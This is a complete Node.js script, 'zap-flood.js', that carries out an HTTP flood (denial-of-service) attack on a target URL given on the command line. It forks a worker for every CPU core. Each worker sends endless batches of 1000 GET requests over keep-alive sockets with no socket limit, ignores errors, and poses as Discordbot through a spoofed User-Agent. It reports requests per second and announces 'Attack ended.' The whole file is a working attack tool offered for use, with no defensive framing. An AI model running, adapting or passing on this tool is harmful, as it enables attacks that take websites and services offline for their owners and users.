const http = require('http');
const https = require('https');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const numCPUs = os.cpus().length;

let totalReq = 0;
let lastReq = 0;
let maxRPS = 0;

if (!target) {
    console.log("Usage: node zap-flood.js <target> <duration>");
    process.exit(1);
}

if (cluster.isPrimary) {
    console.clear();
    console.log(`ZAP-HTTP-MAX FLOOD`);
    console.log(`TARGET: ${target}`);
    console.log(`CORES: ${numCPUs}`);
    console.log(`DURATION: ${duration}s`);

    for (let i = 0; i < numCPUs; i++) cluster.fork();

    setInterval(() => {
        const rps = totalReq - lastReq;
        maxRPS = Math.max(maxRPS, rps);
        lastReq = totalReq;

        console.clear();
        console.log(`ZAP-HTTP-MAX FLOOD`);
        console.log(`Requests Sent:     ${totalReq}`);
        console.log(`Requests/sec:      ${rps}`);
        console.log(`Max Requests/sec:  ${maxRPS}`);
    }, 10000);

    setTimeout(() => {
        console.log("Attack ended.");
        process.exit(0);
    }, duration * 1000);

    // Shared counter update
    cluster.on('message', (worker, msg) => {
        if (msg && msg.reqCount) totalReq += msg.reqCount;
    });

} else {
    const url = new URL(target);
    const client = url.protocol === 'https:' ? https : http;

    const agent = new client.Agent({
        keepAlive: true,
        maxSockets: Infinity,
    });

    function blast() {
        let sent = 0;

        for (let i = 0; i < 1000; i++) {
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname || "/",
                method: 'GET',
                headers: {
                    'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                },
                agent
            };

            const req = client.request(options, () => {});
            req.on('error', () => {});
            req.end();

            sent++;
        }

        process.send({ reqCount: sent });
        setImmediate(blast);
    }

    blast();
}
